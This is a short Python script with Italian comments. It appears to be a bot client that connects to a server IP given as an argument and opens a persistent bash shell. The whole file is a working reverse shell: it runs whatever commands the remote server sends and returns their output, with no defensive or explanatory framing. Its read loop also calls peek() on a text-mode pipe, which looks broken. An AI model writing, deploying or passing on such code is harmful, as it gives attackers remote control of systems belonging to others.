import sys
from socket import *
from subprocess import Popen, PIPE

def main():
    if len(sys.argv) != 2:
        print("Uso: python3 client.py <server_ip>")
        sys.exit(1)

    server_ip = sys.argv[1]
    server_port = 8000

    client = socket(AF_INET, SOCK_STREAM)
    try:
        client.connect((server_ip, server_port))
        print(f"Connesso a {server_ip}:{server_port}")
        client.sendall("Bot pronto".encode())

        # Avvia una shell bash interattiva persistente
        shell = Popen(["/bin/bash"], stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)

        while True:
            command = client.recv(1024).decode().strip()
            if command.lower() == "exit":
                break

            # Invia il comando alla shell attiva
            shell.stdin.write(command + '\n')
            shell.stdin.flush()

            # Legge l'output (usa una lettura limitata per evitare blocchi)
            output = shell.stdout.readline()
            buffer = ""
            while output:
                buffer += output
                # Lettura non bloccante finché c'è output
                if shell.stdout.peek(1):  # Richiede `text=True` e Python 3.5+
                    output = shell.stdout.readline()
                else:
                    break

            if not buffer.strip():
                buffer = "[Comando eseguito, nessun output visibile]"

            client.sendall(buffer.encode())

    except Exception as e:
        print("Errore:", e)
    finally:
        client.close()
        print("Connessione chiusa.")

if __name__ == "__main__":
    main()
